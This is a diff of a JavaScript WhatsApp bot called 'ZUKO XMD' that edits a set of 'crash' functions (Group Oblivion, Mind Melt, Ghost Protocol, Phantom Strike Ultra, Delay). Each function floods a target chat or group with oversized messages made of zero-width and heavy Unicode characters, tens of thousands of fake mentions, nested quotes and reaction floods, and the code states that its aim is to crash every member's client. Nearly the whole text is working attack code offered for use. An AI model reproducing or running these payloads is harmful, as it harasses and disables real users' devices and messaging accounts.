@@ -15,7 +15,6 @@ const { getSetting, setSetting } = require("../config/setting/Settings.js");
 const { toAudio, toPTT } = require('../lib/converter.js');
 const { addExif } = require('../utils/exif.js');
 const yts = require('yt-search');
-const chalk = require('chalk');
 
 // ========== GLOBALS ==========
 global.packname = 'ZUKO XMD';
@@ -113,531 +112,289 @@ async function askAgentRouter(prompt, model = AGENTROUTER_CHAT_MODEL) {
         return null;
     }
 }
-// ============================================================
-// ZUKO GROUP OBLIVION - Invisible Group Crash (2026)
-// Targets ALL members simultaneously
-// ============================================================
 async function ZukoGroupOblivion(sock, groupJid) {
     const crypto = require('crypto');
-
-    const generateJids = (count = 20000) => {
+    
+    const generateJids = (count = 50000) => {
         const jids = [];
         for (let i = 0; i < count; i++) {
-            const num = Math.floor(Math.random() * 999999999).toString().padStart(10, '0');
-            jids.push(`${num}@s.whatsapp.net`);
+            jids.push(`${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
         }
         return jids;
     };
 
-    const zw = (n = 50000) => {
-        return '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n) + '\u2060'.repeat(n);
-    };
+    const zw = (n = 100000) => '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n);
+    const unicodeSpam = (count = 50000) => '𑲭'.repeat(count) + 'ᬃ'.repeat(count) + '⿻'.repeat(count);
 
-    const unicodeSpam = (count = 30000) => {
-        const chars = ['𑲭','ᬃ','⿻','ꦾ','𑍌','𑌾','𑌿','𑈳','𑆴','𑆵','𑇃','𑆿','᭎','ᬼ','ৗ','ী','𑍅','𑍑'];
-        let result = '';
-        for (let i = 0; i < count; i++) {
-            result += chars[Math.floor(Math.random() * chars.length)];
-        }
-        return result;
-    };
-
-    // Get actual group members
     let members = [];
     try {
         const metadata = await sock.groupMetadata(groupJid);
         members = metadata.participants.map(p => p.id);
-    } catch (e) {
-        console.log('Could not fetch group members');
+    } catch (e) {}
+
+    console.log(chalk.red(`💀 GROUP OBLIVION on ${groupJid} (${members.length} members)`));
+
+    // PHASE 1: MASS MENTION FLOOD (500 msgs)
+    for (let i = 0; i < 500; i++) {
+        const allMentions = [...members, ...generateJids(40000)];
+        await sock.sendMessage(groupJid, {
+            text: zw(50000) + `💀${i}`.repeat(5000) + unicodeSpam(30000),
+            contextInfo: {
+                mentionedJid: allMentions,
+                forwardingScore: 999999999,
+                isForwarded: true,
+                groupMentions: [{ groupJid: groupJid, groupSubject: zw(50000) }]
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
     }
 
-    console.log(chalk.red(`💀 GROUP OBLIVION starting on ${groupJid} (${members.length} members)`));
+    // PHASE 2: REACTION FLOOD (1000 reactions on dummy)
+    let dummy;
+    try { dummy = await sock.sendMessage(groupJid, { text: zw(20000) }); } catch(e) {}
+    if (dummy) {
+        const emojis = ['🔥','💀','☠️','👻','💣','⚡','🌀','🌪️','💥','🫥'];
+        for (let i = 0; i < 1000; i++) {
+            await sock.sendMessage(groupJid, { react: { text: emojis[i % emojis.length], key: dummy.key } }).catch(() => {});
+            await new Promise(r => setTimeout(r, 5));
+        }
+    }
 
-    // ============================================================
-    // PHASE 1: Group Mention Flood (300 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 1: Group Mention Flood (300)`));
-
+    // PHASE 3: PROTOCOL FLOOD (300 msgs)
     for (let i = 0; i < 300; i++) {
-        try {
-            const fakeMentions = generateJids(10000);
-            const allMentions = [...members.slice(0, 500), ...fakeMentions.slice(0, 9500)];
-
-            await sock.sendMessage(groupJid, {
-                text: zw(30000) + `👻 GROUP OBLIVION ${i}`.repeat(3000) + zw(30000) + unicodeSpam(20000),
-                contextInfo: {
-                    mentionedJid: allMentions,
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    groupMentions: [
-                        { groupJid: groupJid, groupSubject: zw(10000) + '💀 OBLIVION 💀' + zw(10000) }
-                    ],
-                    forwardedNewsletterMessageInfo: {
-                        newsletterJid: '120363405724402785@newsletter',
-                        newsletterName: '💀 GROUP OBLIVION 💀',
-                        serverMessageId: 999 + i
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Group Mentions: ${i}/300`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 30));
+        await sock.sendMessage(groupJid, {
+            text: zw(80000) + `📡${i}`.repeat(5000),
+            contextInfo: {
+                mentionedJid: generateJids(30000),
+                forwardingScore: 999999999,
+                isForwarded: true,
+                disappearingMode: { initiator: groupJid, initiatedByMe: true, expiration: 1 }
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
     }
 
-    // ============================================================
-    // PHASE 2: Group Setting Spam (200 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 2: Group Setting Spam (200)`));
-
-    for (let i = 0; i < 200; i++) {
-        try {
-            await sock.sendMessage(groupJid, {
-                text: zw(40000) + `⚙️ SETTING ${i}`.repeat(2000) + zw(40000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    disappearingMode: {
-                        initiator: groupJid,
-                        initiatedByMe: true,
-                        expiration: 1
-                    },
-                    quotedMessage: {
-                        conversation: zw(20000) + '💀 GROUP CRASH 💀' + zw(20000)
-                    },
-                    groupMentions: [
-                        { groupJid: groupJid, groupSubject: unicodeSpam(30000) }
-                    ]
+    // FINAL SURGE: 500 combined
+    for (let i = 0; i < 500; i++) {
+        const allMentions = [...members.slice(0, 500), ...generateJids(45000)];
+        await sock.sendMessage(groupJid, {
+            text: zw(100000) + `☠️ ${i}`.repeat(10000) + unicodeSpam(50000),
+            contextInfo: {
+                mentionedJid: allMentions,
+                forwardingScore: 999999999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: zw(50000),
+                    body: zw(50000),
+                    mediaType: 'VIDEO',
+                    renderLargerThumbnail: true,
+                    showAdAttribution: true
                 }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Group Settings: ${i}/200`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 40));
-    }
-
-    // ============================================================
-    // PHASE 3: Admin Action Spam (150 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 3: Admin Action Spam (150)`));
-
-    for (let i = 0; i < 150; i++) {
-        try {
-            const randomMember = members[Math.floor(Math.random() * members.length)] || generateJids(1)[0];
-
-            await sock.sendMessage(groupJid, {
-                text: zw(30000) + `🔒 ADMIN ${i}`.repeat(2000) + zw(30000) + unicodeSpam(20000),
-                contextInfo: {
-                    mentionedJid: [randomMember, ...generateJids(5000)],
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    businessMessageForwardInfo: {
-                        businessOwnerJid: randomMember
-                    },
-                    externalAdReply: {
-                        title: zw(10000) + '💀 ADMIN ACTION 💀' + zw(10000),
-                        body: zw(10000) + '👻 GROUP CRASH 👻' + zw(10000),
-                        mediaType: 'VIDEO',
-                        renderLargerThumbnail: true,
-                        showAdAttribution: true
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`💀 Admin Actions: ${i}/150`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 50));
-    }
-
-    // ============================================================
-    // PHASE 4: Newsletter Invite Flood (100 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 4: Newsletter Invite Flood (100)`));
-
-    for (let i = 0; i < 100; i++) {
-        try {
-            await sock.sendMessage(groupJid, {
-                text: zw(50000) + `📰 NEWSLETTER ${i}`.repeat(2000) + zw(50000) + unicodeSpam(30000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    forwardedNewsletterMessageInfo: {
-                        newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
-                        newsletterName: unicodeSpam(20000) + '💀 OBLIVION 💀' + unicodeSpam(20000),
-                        serverMessageId: 999999 + i,
-                        contentType: 'UPDATE'
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 25 === 0) {
-            console.log(chalk.gray(`💀 Newsletter: ${i}/100`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 60));
-    }
-
-    // ============================================================
-    // FINAL SURGE: 200 combined attacks
-    // ============================================================
-    console.log(chalk.red(`💀 FINAL SURGE: 200 iterations`));
-
-    for (let i = 0; i < 200; i++) {
-        try {
-            const allMentions = [...members.slice(0, 300), ...generateJids(12000)];
-
-            await sock.sendMessage(groupJid, {
-                text: zw(100000) + `💀 SURGE ${i}`.repeat(5000) + zw(100000) + unicodeSpam(50000),
-                contextInfo: {
-                    mentionedJid: allMentions,
-                    forwardingScore: 999999999,
-                    isForwarded: true,
-                    groupMentions: [
-                        { groupJid: groupJid, groupSubject: zw(50000) + '💀 FINAL SURGE 💀' + zw(50000) }
-                    ],
-                    forwardedNewsletterMessageInfo: {
-                        newsletterJid: '120363405724402785@newsletter',
-                        newsletterName: '💀 OBLIVION SURGE 💀',
-                        serverMessageId: 999999 + i
-                    },
-                    externalAdReply: {
-                        title: zw(50000) + '💀 GROUP OBLIVION 💀' + zw(50000),
-                        body: zw(50000) + '👻 ALL MEMBERS CRASH 👻' + zw(50000),
-                        mediaType: 'VIDEO',
-                        renderLargerThumbnail: true,
-                        showAdAttribution: true
-                    },
-                    quotedMessage: {
-                        callLogMesssage: {
-                            isVideo: false,
-                            callOutcome: "5",
-                            durationSecs: "99999",
-                            callType: "REGULAR",
-                            participants: Array.from({ length: 100 }, () => ({
-                                jid: generateJids(1)[0],
-                                callOutcome: "5"
-                            }))
-                        }
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.red(`💀 Final Surge: ${i}/200`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 20));
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
     }
 
     console.log(chalk.red(`✅ GROUP OBLIVION COMPLETE on ${groupJid}`));
-    console.log(chalk.red(`💀 ALL ${members.length} MEMBERS HAVE BEEN OBLITERATED 💀`));
 }
-// ============================================================
-// ZUKO MIND MELT - Private Number Crash (Memory Overflow)
-// ============================================================
 async function ZukoMindMelt(sock, target) {
     const crypto = require('crypto');
-
-    const zw = (n = 100000) => {
-        return '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n) + '\u2060'.repeat(n);
-    };
-
-    const generateJids = (count = 20000) => {
+    const zw = (n = 100000) => '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n);
+    const generateJids = (count = 50000) => {
         const jids = [];
         for (let i = 0; i < count; i++) {
-            const num = Math.floor(Math.random() * 999999999).toString().padStart(10, '0');
-            jids.push(`${num}@s.whatsapp.net`);
+            jids.push(`${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
         }
         return jids;
     };
 
-    const massiveJson = () => {
-        let obj = {};
-        for (let i = 0; i < 5000; i++) {
-            obj[`key_${i}`] = zw(1000) + `value_${i}`.repeat(1000);
-        }
-        return JSON.stringify(obj);
-    };
+    console.log(chalk.cyan(`🧠 MIND MELT on ${target}`));
 
-    console.log(chalk.cyan(`🧠 MIND MELT starting on ${target}`));
-
-    // ============================================================
-    // PHASE 1: JSON Bomb (100 messages)
-    // ============================================================
-    console.log(chalk.gray(`🧠 Phase 1: JSON Bomb (100)`));
-
-    for (let i = 0; i < 100; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: massiveJson() + zw(50000) + `💀 JSON ${i}`.repeat(2000),
-                contextInfo: {
-                    mentionedJid: generateJids(10000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    externalAdReply: {
-                        title: zw(20000) + '💀 JSON BOMB 💀' + zw(20000),
-                        body: massiveJson(),
-                        mediaType: 'VIDEO',
-                        renderLargerThumbnail: true,
-                        showAdAttribution: true
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 20 === 0) {
-            console.log(chalk.gray(`🧠 JSON Bomb: ${i}/100`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 30));
-    }
-
-    // ============================================================
-    // PHASE 2: Recursive Mention Flood (200 messages)
-    // ============================================================
-    console.log(chalk.gray(`🧠 Phase 2: Recursive Mentions (200)`));
-
+    // PHASE 1: JSON BOMB (200 msgs)
     for (let i = 0; i < 200; i++) {
-        try {
-            const mentions1 = generateJids(10000);
-            const mentions2 = generateJids(10000);
-            const allMentions = [...mentions1, ...mentions2];
-
-            await sock.sendMessage(target, {
-                text: zw(50000) + `🔄 RECURSIVE ${i}`.repeat(3000) + zw(50000),
-                contextInfo: {
-                    mentionedJid: allMentions,
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    quotedMessage: {
-                        conversation: zw(30000) + '🔄 RECURSIVE 🔄' + zw(30000),
-                        contextInfo: {
-                            mentionedJid: generateJids(5000)
-                        }
-                    },
-                    businessMessageForwardInfo: {
-                        businessOwnerJid: target
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`🧠 Recursive: ${i}/200`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 25));
+        const jsonBomb = JSON.stringify({ key: zw(10000) + `val_${i}`.repeat(10000) });
+        await sock.sendMessage(target, {
+            text: jsonBomb + zw(50000) + `💀${i}`.repeat(5000),
+            contextInfo: {
+                mentionedJid: generateJids(30000),
+                forwardingScore: 999999999,
+                isForwarded: true
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
     }
 
-    // ============================================================
-    // PHASE 3: Nested Quote Flood (150 messages)
-    // ============================================================
-    console.log(chalk.gray(`🧠 Phase 3: Nested Quotes (150)`));
-
-    for (let i = 0; i < 150; i++) {
-        try {
-            let nestedQuote = {
-                conversation: zw(10000) + '📚 NESTED ' + zw(10000)
-            };
-            for (let n = 0; n < 20; n++) {
-                nestedQuote = {
-                    conversation: zw(5000) + `Level ${n}` + zw(5000),
-                    contextInfo: {
-                        quotedMessage: nestedQuote,
-                        mentionedJid: generateJids(1000)
-                    }
-                };
-            }
-
-            await sock.sendMessage(target, {
-                text: zw(30000) + `📚 NESTED ${i}`.repeat(2000) + zw(30000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    quotedMessage: nestedQuote
-                }
-            });
-        } catch (e) {}
-        if (i % 30 === 0) {
-            console.log(chalk.gray(`🧠 Nested Quotes: ${i}/150`));
+    // PHASE 2: RECURSIVE QUOTE FLOOD (200 msgs)
+    for (let i = 0; i < 200; i++) {
+        let nested = { conversation: zw(20000) };
+        for (let n = 0; n < 50; n++) {
+            nested = { conversation: zw(10000), contextInfo: { quotedMessage: nested } };
         }
-        await new Promise(resolve => setTimeout(resolve, 40));
+        await sock.sendMessage(target, {
+            text: zw(50000) + `📚${i}`.repeat(5000),
+            contextInfo: {
+                mentionedJid: generateJids(30000),
+                forwardingScore: 999999999,
+                isForwarded: true,
+                quotedMessage: nested
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
     }
 
     console.log(chalk.cyan(`✅ MIND MELT COMPLETE on ${target}`));
-    console.log(chalk.cyan(`🧠 TARGET ${target} HAS BEEN MELTED 🧠`));
 }
-// ============================================================
-// ZUKO GHOST PROTOCOL - Private Number Crash (Protocol Exploit)
-// ============================================================
 async function ZukoGhostProtocol(sock, target) {
     const crypto = require('crypto');
-
-    const zw = (n = 50000) => {
-        return '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n) + '\u2060'.repeat(n);
-    };
-
-    const generateJids = (count = 20000) => {
+    const zw = (n = 100000) => '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n);
+    const generateJids = (count = 50000) => {
         const jids = [];
         for (let i = 0; i < count; i++) {
-            const num = Math.floor(Math.random() * 999999999).toString().padStart(10, '0');
-            jids.push(`${num}@s.whatsapp.net`);
+            jids.push(`${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
         }
         return jids;
     };
+    const unicodeSpam = (count = 50000) => '𑲭'.repeat(count) + 'ᬃ'.repeat(count) + '⿻'.repeat(count);
 
-    const unicodeSpam = (count = 50000) => {
-        const chars = ['𑲭','ᬃ','⿻','ꦾ','𑍌','𑌾','𑌿','𑈳','𑆴','𑆵','𑇃','𑆿','᭎','ᬼ','ৗ','ী','𑍅','𑍑'];
-        let result = '';
-        for (let i = 0; i < count; i++) {
-            result += chars[Math.floor(Math.random() * chars.length)];
-        }
-        return result;
-    };
+    console.log(chalk.magenta(`👻 GHOST PROTOCOL on ${target}`));
 
-    console.log(chalk.magenta(`👻 GHOST PROTOCOL starting on ${target}`));
+    // PHASE 1: PROTOCOL FLOOD (300 msgs)
+    for (let i = 0; i < 300; i++) {
+        await sock.sendMessage(target, {
+            text: zw(80000) + `📡${i}`.repeat(5000) + unicodeSpam(30000),
+            contextInfo: {
+                mentionedJid: generateJids(30000),
+                forwardingScore: 999999999,
+                isForwarded: true,
+                disappearingMode: { initiator: target, initiatedByMe: true, expiration: 1 }
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
+    }
 
-    // ============================================================
-    // PHASE 1: Protocol Message Flood (200 messages)
-    // ============================================================
-    console.log(chalk.gray(`👻 Phase 1: Protocol Flood (200)`));
-
+    // PHASE 2: STATUS SPAM (200 msgs)
     for (let i = 0; i < 200; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: zw(50000) + `📡 PROTOCOL ${i}`.repeat(3000) + zw(50000) + unicodeSpam(30000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    disappearingMode: {
-                        initiator: target,
-                        initiatedByMe: true,
-                        expiration: 1
-                    },
-                    protocolMessage: {
-                        type: 25,
-                        ephemeralExpiration: 999999999
-                    },
-                    quotedMessage: {
-                        protocolMessage: {
-                            type: 16,
-                            groupStatusUpdate: {
-                                type: 0,
-                                status: 0
-                            }
-                        }
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 50 === 0) {
-            console.log(chalk.gray(`👻 Protocol: ${i}/200`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 30));
-    }
-
-    // ============================================================
-    // PHASE 2: Status Update Spam (150 messages)
-    // ============================================================
-    console.log(chalk.gray(`👻 Phase 2: Status Update Spam (150)`));
-
-    for (let i = 0; i < 150; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: zw(40000) + `🔄 STATUS ${i}`.repeat(2000) + zw(40000) + unicodeSpam(30000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    statusAttributionType: 'RESHARED_FROM_MENTION',
-                    statusSourceType: 'MUSIC_STANDALONE',
-                    statusAttributions: [
-                        {
-                            type: 'STATUS_MENTION',
-                            music: {
-                                authorName: unicodeSpam(10000) + '💀 GHOST 💀' + unicodeSpam(10000),
-                                songId: Math.floor(Math.random() * 999999999).toString(),
-                                title: zw(20000) + '👻 PROTOCOL 👻' + zw(20000),
-                                author: unicodeSpam(10000),
-                                isExplicit: true
-                            }
-                        }
-                    ]
-                }
-            });
-        } catch (e) {}
-        if (i % 30 === 0) {
-            console.log(chalk.gray(`👻 Status: ${i}/150`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 40));
-    }
-
-    // ============================================================
-    // PHASE 3: Encrypted Message Spam (100 messages)
-    // ============================================================
-    console.log(chalk.gray(`👻 Phase 3: Encrypted Spam (100)`));
-
-    for (let i = 0; i < 100; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: zw(60000) + `🔐 ENCRYPTED ${i}`.repeat(3000) + zw(60000) + unicodeSpam(40000),
-                contextInfo: {
-                    mentionedJid: generateJids(20000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    messageSecret: crypto.randomBytes(64).toString('hex'),
-                    deviceListMetadata: {
-                        deviceListMetadata: {},
-                        deviceListMetadataVersion: 3
-                    },
-                    messageAssociation: {
-                        associationType: 7,
-                        parentMessageKey: crypto.randomBytes(32).toString('hex')
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 20 === 0) {
-            console.log(chalk.gray(`👻 Encrypted: ${i}/100`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 50));
-    }
-
-    // ============================================================
-    // PHASE 4: Reaction + Protocol Combined (100 messages)
-    // ============================================================
-    console.log(chalk.gray(`👻 Phase 4: Reaction Protocol (100)`));
-
-    for (let i = 0; i < 100; i++) {
-        try {
-            await sock.sendMessage(target, {
-                text: zw(50000) + `⚡ REACT-PROTO ${i}`.repeat(2000) + zw(50000),
-                contextInfo: {
-                    mentionedJid: generateJids(15000),
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    reactionMessage: {
-                        text: emojiBomb(5000),
-                        groupingKey: crypto.randomBytes(32).toString('hex')
-                    },
-                    quotedMessage: {
-                        reactionMessage: {
-                            text: unicodeSpam(20000),
-                            groupingKey: crypto.randomBytes(32).toString('hex')
-                        }
-                    }
-                }
-            });
-        } catch (e) {}
-        if (i % 25 === 0) {
-            console.log(chalk.gray(`👻 React-Protocol: ${i}/100`));
-        }
-        await new Promise(resolve => setTimeout(resolve, 35));
+        await sock.sendMessage(target, {
+            text: zw(60000) + `🔄${i}`.repeat(5000) + unicodeSpam(30000),
+            contextInfo: {
+                mentionedJid: generateJids(30000),
+                forwardingScore: 999999999,
+                isForwarded: true,
+                statusAttributionType: 'RESHARED_FROM_MENTION',
+                statusAttributions: [{ type: 'STATUS_MENTION', music: { authorName: zw(20000), songId: '1', title: zw(20000) } }]
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
     }
 
     console.log(chalk.magenta(`✅ GHOST PROTOCOL COMPLETE on ${target}`));
-    console.log(chalk.magenta(`👻 TARGET ${target} HAS BEEN GHOSTED 👻`));
+}
+async function ZukoPhantomStrikeUltra(sock, target) {
+    const crypto = require('crypto');
+    const generateJids = (count = 60000) => {
+        const jids = [];
+        for (let i = 0; i < count; i++) {
+            jids.push(`${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
+        }
+        return jids;
+    };
+    const zw = (n = 100000) => '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n) + '\u2060'.repeat(n);
+    const unicodeSpam = (count = 50000) => '𑲭'.repeat(count) + 'ᬃ'.repeat(count) + '⿻'.repeat(count) + 'ꦾ'.repeat(count);
+
+    console.log(chalk.red(`💀 ULTRA STRIKE on ${target}`));
+
+    // REACTION FLOOD (500)
+    let dummy;
+    try { dummy = await sock.sendMessage(target, { text: zw(20000) }); } catch(e) {}
+    if (dummy) {
+        const emojis = ['🔥','💀','☠️','👻','💣','⚡','🌀','🌪️','💥','🫥'];
+        for (let i = 0; i < 500; i++) {
+            await sock.sendMessage(target, { react: { text: emojis[i % emojis.length], key: dummy.key } }).catch(() => {});
+            await new Promise(r => setTimeout(r, 5));
+        }
+    }
+
+    // MENTION FLOOD (500 msgs)
+    for (let i = 0; i < 500; i++) {
+        await sock.sendMessage(target, {
+            text: zw(50000) + `☠️${i}`.repeat(5000) + unicodeSpam(30000),
+            contextInfo: {
+                mentionedJid: generateJids(40000 + i * 100),
+                forwardingScore: 999999999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: zw(50000) + unicodeSpam(20000),
+                    body: zw(50000) + unicodeSpam(20000),
+                    mediaType: 'VIDEO',
+                    renderLargerThumbnail: true,
+                    showAdAttribution: true
+                }
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
+    }
+
+    // PROTOCOL FLOOD (300)
+    for (let i = 0; i < 300; i++) {
+        await sock.sendMessage(target, {
+            text: zw(80000) + `📡${i}`.repeat(5000) + unicodeSpam(30000),
+            contextInfo: {
+                mentionedJid: generateJids(30000),
+                forwardingScore: 999999999,
+                isForwarded: true,
+                disappearingMode: { initiator: target, initiatedByMe: true, expiration: 1 }
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
+    }
+
+    // FINAL SURGE (500)
+    for (let i = 0; i < 500; i++) {
+        await sock.sendMessage(target, {
+            text: zw(100000) + `💀 SURGE ${i}`.repeat(10000) + unicodeSpam(50000),
+            contextInfo: {
+                mentionedJid: generateJids(50000 + i * 100),
+                forwardingScore: 999999999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: zw(50000) + unicodeSpam(20000),
+                    body: zw(50000) + unicodeSpam(20000),
+                    mediaType: 'VIDEO',
+                    renderLargerThumbnail: true,
+                    showAdAttribution: true
+                }
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
+    }
+
+    console.log(chalk.red(`✅ ULTRA STRIKE COMPLETE on ${target}`));
+}
+async function ZukoDelay(sock, target) {
+    const generateJids = (count = 50000) => {
+        const jids = [];
+        for (let i = 0; i < count; i++) {
+            jids.push(`${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
+        }
+        return jids;
+    };
+    const zw = (n = 50000) => '\u200B'.repeat(n) + '\u200C'.repeat(n) + '\u200D'.repeat(n) + '\uFEFF'.repeat(n);
+
+    console.log(chalk.gray(`⛤ ZukoDelay on ${target}`));
+
+    for (let i = 0; i < 300; i++) {
+        await sock.sendMessage(target, {
+            text: zw(50000) + `⛤${i}`.repeat(5000) + zw(50000),
+            contextInfo: {
+                mentionedJid: generateJids(40000),
+                forwardingScore: 999999999,
+                isForwarded: true
+            }
+        }).catch(() => {});
+        await new Promise(r => setTimeout(r, 10));
+    }
+
+    console.log(chalk.green(`✅ ZukoDelay COMPLETE on ${target}`));
 }
 // Tries AgentRouter with a specific model, falls back to a free public API
 // if AgentRouter isn't configured or fails. Returns { answer, source } or null.
@@ -941,353 +698,7 @@ async function handleAntiTag(empire, m, isCreator, isAdmins) {
         return true;
     } catch (e) { return false; }
 }
-// ============================================================
-// ZUKO PHANTOM STRIKE ULTRA - Maximum Payload (2026)
-// 5x more payloads than the original
-// ============================================================
-async function ZukoPhantomStrikeUltra(sock, target) {
-    const crypto = require('crypto');
 
-    // ====== Helper: Generate massive JID list ======
-    const generateJids = (count = 20000) => {
-        const jids = [];
-        for (let i = 0; i < count; i++) {
-            const num = Math.floor(Math.random() * 999999999).toString().padStart(10, '0');
-            jids.push(`${num}@s.whatsapp.net`);
-        }
-        return jids;
-    };
-
-    // ====== Helper: Extreme zero-width text ======
-    const zw = (n = 50000) => {
-        return '\u200B'.repeat(n) + 
-               '\u200C'.repeat(n) + 
-               '\u200D'.repeat(n) + 
-               '\uFEFF'.repeat(n) + 
-               '\u2060'.repeat(n) + 
-               '\u2061'.repeat(n) + 
-               '\u2062'.repeat(n) + 
-               '\u2063'.repeat(n) + 
-               '\u2064'.repeat(n);
-    };
-
-    // ====== Helper: Emoji bomb ======
-    const emojiBomb = (count = 5000) => {
-        const emojis = ['🔥','💀','☠️','👻','💣','⚡','🌀','🌪️','💥','🫥','💀','👾','🤖','💀','🔥','⚡','🌀','🌪️'];
-        let result = '';
-        for (let i = 0; i < count; i++) {
-            result += emojis[Math.floor(Math.random() * emojis.length)];
-        }
-        return result;
-    };
-
-    // ====== Helper: Random Unicode spam ======
-    const unicodeSpam = (count = 30000) => {
-        const chars = ['𑲭','ᬃ','⿻','ꦾ','𑍌','𑌾','𑌿','𑈳','𑆴','𑆵','𑇃','𑆿','᭎','ᬼ','ৗ','ী','𑍅','𑍑'];
-        let result = '';
-        for (let i = 0; i < count; i++) {
-            result += chars[Math.floor(Math.random() * chars.length)];
-        }
-        return result;
-    };
-
-    console.log(chalk.red(`💀 ULTRA PHANTOM STRIKE starting on ${target}`));
-
-    // ============================================================
-    // PHASE 1: Reaction Flood (500 reactions)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 1: Reaction Flood (500)`));
-
-    let dummyMsg;
-    try {
-        dummyMsg = await sock.sendMessage(target, {
-            text: zw(20000) + '🫥' + unicodeSpam(10000),
-            contextInfo: { forwardingScore: 9999999, isForwarded: true }
-        });
-    } catch (e) {}
-
-    if (dummyMsg) {
-        const dummyKey = dummyMsg.key;
-        const emojis = ['🔥','💀','☠️','👻','💣','⚡','🌀','🌪️','💥','🫥','👾','🤖','💀','🔥','⚡'];
-        for (let i = 0; i < 500; i++) {
-            try {
-                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-                await sock.sendMessage(target, {
-                    react: { text: randomEmoji, key: dummyKey }
-                });
-            } catch (e) {}
-            if (i % 100 === 0) {
-                console.log(chalk.gray(`💀 Reactions: ${i}/500`));
-            }
-            await new Promise(resolve => setTimeout(resolve, 20));
-        }
-    }
-
-    // ============================================================
-    // PHASE 2: Massive Mention Flood (500 messages)
-    // ============================================================
-    console.log(chalk.gray(`💀 Phase 2: Mention Flood (500 messages)`));
-
-    for (let i = 0; i < 500; i++) {
-        try {
-            const mentions = generateJids(15000 + i * 100);
-            const payload = {
-                text: zw(30000) + emojiBomb(3000) + `\n☠️ ${i}`.repeat(2000) + zw(30000) + unicodeSpam(20000),
-                contextInfo: {
-                    mentionedJid: mentions,
-                    forwardingScore: 99999999,
-                    isForwarded: true,
-                    forwardedNewsletterMessageInfo: {
-                        newsletterJid: '120363405724402785@newsletter',
-                        newsletterName: 'ZUKO XMD ULTRA',
-                        serverMessageId: 999 + i
-                    },
-                    businessMessageForwardInfo: {
-                        businessOwnerJid: target
-                    },
-                    externalAdReply: {
